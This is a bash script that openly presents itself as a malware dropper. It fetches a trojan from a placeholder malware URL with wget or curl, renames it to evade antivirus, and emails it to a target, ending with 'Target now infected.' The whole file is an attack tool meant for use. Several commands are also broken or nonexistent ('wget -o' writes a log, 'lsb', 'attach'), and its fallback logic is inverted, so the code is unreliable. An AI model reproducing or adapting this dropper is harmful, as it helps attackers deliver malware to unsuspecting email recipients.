#!/bin/bash

# Set environment variables
EMAIL="user@example.com" # Replace with target user's email
DOWNLOAD_URL="https://your-malware-url.com/trojan.exe" # Replace with actual download URL
TEMP_DIR="/tmp/dropper"
TARGET_FILE="trojan.exe"

# Create temp directory if it doesn't exist
mkdir -p "$TEMP_DIR"

# Download the Trojan using wget or curl
echo "Downloading..."
wget -q "$DOWNLOAD_URL" -o "$TEMP_DIR/$TARGET_FILE" || \
  curl -s "$DOWNLOAD_URL" -o "$TEMP_DIR/$TARGET_FILE" || {
    echo "Download failed. Check URL."
    exit 1
}

# Verify download (Checksum) - Optional, but Recommended
echo "Verifying checksum..."
SHA256=$(sha256sum "$TEMP_DIR/$TARGET_FILE" | awk '{print $1}')
EXPECTED_SHA256="<YOUR_EXPECTED_SHA256>" # Replace with the actual SHA256 of your Trojan

if [[ "$SHA256" != "$EXPECTED_SHA256" ]]; then
  echo "Checksum failed! Download may be corrupted."
  exit 1
fi

# Rename file to trick anti-virus (optional)
echo "Renaming file..."
mv "$TEMP_DIR/$TARGET_FILE" "$TEMP_DIR/$TARGET_FILE.tmp" || \
  cp "$TEMP_DIR/$TARGET_FILE" "$TEMP_DIR/$TARGET_FILE.tmp"

# Prepare the email payload
SUBJECT="Malware Delivery"
MESSAGE="Check this out!"
ATTACHMENT="$TEMP_DIR/$TARGET_FILE.tmp"
SIZE=$(lsb -r "$ATTACHMENT" | awk '{print $(4) "B" }') # Get attachment size in bytes

# Send the email using attach (optional, but recommended for larger files)
echo "Sending email..."
attach -t "trojan.exe" -s "$SUBJECT" -m "$MESSAGE" -a "$ATTACHMENT" -b "$SIZE" "$EMAIL" || {
  echo "Email failed to send. Try again."
}

# If attachment fails, fallback to direct download link in body
if lsb -r "$TEMP_DIR/$TARGET_FILE.tmp" >/dev/null 2>&1; then # Check if file exists
    MESSAGE="$MESSAGE\n\nDownload the Trojan Here:" \
            "\n$DOWNLOAD_URL"
else
    echo "Attachment failed, falling back to direct download link in body..."
fi


# Clean up (optional)
echo "Cleaning up temporary files..."
rm -rf "$TEMP_DIR"

echo "Dropper complete! Email sent. Target now infected."
